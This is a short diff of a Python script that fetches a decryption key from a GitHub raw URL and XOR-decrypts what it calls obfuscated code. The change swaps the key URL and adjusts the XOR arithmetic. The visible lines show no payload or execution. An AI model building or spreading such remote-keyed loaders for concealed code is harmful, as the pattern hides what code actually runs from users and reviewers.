@@ -3,7 +3,7 @@ import requests
 
 # Fetch key from GitHub
 def fetch_key_from_github():
-    url = "https://raw.githubusercontent.com/waelhadi/art1/main/w1213.txt"
+    url = "https://raw.githubusercontent.com/waelhadi/MFTAHTHFAER/refs/heads/main/TAHFER.txt"
     response = requests.get(url)
     if response.status_code == 200:
         try:
@@ -19,7 +19,7 @@ def fetch_key_from_github():
 
 # XOR decryption function
 def xor_decrypt(data, key):
-    return ''.join(chr(ord(char) ^ key) for char in data)
+    return ''.join(chr((ord(char) ^ key) % 256) for char in data)
 
 # Decrypt function for obfuscated code
 def decrypt_function(encrypted_parts):
